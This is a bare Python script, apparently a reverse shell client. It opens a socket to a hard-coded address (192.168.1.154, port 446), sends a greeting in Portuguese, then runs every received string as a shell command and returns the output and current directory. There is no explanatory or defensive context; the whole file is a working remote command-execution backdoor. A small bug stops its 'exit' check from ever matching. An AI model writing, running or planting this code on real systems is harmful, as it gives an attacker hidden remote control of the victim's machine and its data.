from socket import *
import os
import subprocess

ip='192.168.1.154'
port=446
size=1024

s=socket(AF_INET,SOCK_STREAM)
s.connect((ip,port))
s.send(b"Conexao Recevid:\n")

def main():
    while True:
        data=s.recv(1024)
        if data[:-1]=='exit':
            s.close()
            break
        proc = subprocess.Popen(data.decode(),shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
        output=proc.stdout.read()+proc.stderr.read()+'\n'.encode()+os.getcwd().encode()+'>'.encode()
        ##if data.decode().startswith('cd')==True:
           ## os.chdir(data[3:].decode().replace('\n',''))
            ##s.send(b'\n')
            ##s.send(output)
        s.send(output)
main()